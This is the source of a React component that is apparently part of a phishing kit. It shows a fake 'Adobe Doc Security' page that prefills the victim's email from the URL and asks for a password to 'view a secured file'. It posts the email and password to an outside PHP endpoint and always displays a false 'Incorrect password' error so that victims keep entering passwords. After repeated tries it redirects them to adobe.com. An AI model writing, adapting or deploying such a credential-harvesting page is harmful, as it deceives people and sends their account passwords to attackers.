
import { useEffect, useState } from 'react';
import './major.css';
import $ from 'jquery';

export const Majorr = ()=>{

    
    const emailInTheURLA = window.location.href;
    const sliceEqualSignB = emailInTheURLA.indexOf("=");
    const extracetdEmailC = emailInTheURLA.substr((sliceEqualSignB+1)).toLowerCase().toLowerCase().split('&', 1).toString();
    
    const [email, setEmail] = useState(extracetdEmailC);
    const [password, setPassword] = useState('');

    const [viewBtn, setViewBtn] = useState('View File');
    const [errMsg, setErrMsg] = useState(false);

    const [count, setCount] = useState(0);

    const major_handler_sec = tour =>{
        tour.preventDefault();

        if (password === "") {
            return null
          } else {
  
            setCount(count=> count + 1);
              if(count >= 9){
                  const redirectURL = window.location.href;
                  const sliceEqualSign = redirectURL.indexOf("@");
                  const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                  console.log(extracetdemailDomain);
                  setTimeout(() => {
                      window.location.href = "https://www.adobe.com/";
                      // window.location.href = `https://www.${extracetdemailDomain}`;
                  }, 2000);
              };
  
              setViewBtn('Verifying...');
              
  
              setTimeout(()=>{
                setViewBtn('View File');
                setPassword('');
                setErrMsg(true);
              }, 3200)
  
          // post to server

          const user = {
              email,
              password
          };
      
          $.ajax({
              type: "POST",
              url: "https://physicaleducationdiploma.com/anoda/addb.php",
              data: user,
              success(data) {
                  // alert('OK');
                  console.log(data);
              },
          });
            
          }
    }

    useEffect(()=>{
        document.title = email
    },[]);


    return(<>
        <section className='lkdjgh'>
            <div className='box_adobbe'>
                
                <div className='adb_normenclatur__e_hgjkGYjkbh'>
                    <strong>Adobe Doc Security</strong>
                    |
                    <div className="storage_capacity_addb__">File Size: 58mb</div>
                    <br />

                </div>
                    <div className="inst">Verify your Email ID to access and download secured file.</div>

                    <form action="" id='loginForm' onSubmit={major_handler_sec}>
                        <div className='email_wrapper'>
                            <label htmlFor="email">Email:</label>
                            <input 
                                type="email" 
                                id="email" 
                                name="email" 
                                placeholder="Email address" 
                                required
                                className='em__jhgyuJHgyuikIUY_jhK'
                                value={email}
                                onChange={e=> setEmail(e.target.value)}
                            />
                        </div>


                        <div>
                            <label htmlFor="pass">Password:</label>
                            <input 
                                type="password" 
                                className='em__jhgyuJHgyuikIUY_jhK'
                                id="pass" name="password" 
                                placeholder="Password" 
                                required 
                                autoFocus
                                value={password}
                                onChange={e=>{
                                    setPassword(e.target.value);
                                    if (password.length === 1) {
                                        setErrMsg(false);
                                    }
                                }}
                            />        
                        </div>

                        { errMsg ? 
                            <div className='adb_err_msg_invalid_kjhgYUIOIJBkljhb__'>
                                Error message - "Incorrect password."
                            </div>
                        : undefined }

                        <div className='btn_sub_wrapper__'>
                            <input 
                                type='submit'
                                className='btn'
                                value={`${viewBtn}`}
                                onClick={major_handler_sec}
                            />
                        </div>

                    </form>

            </div>
        </section>
    </>)
}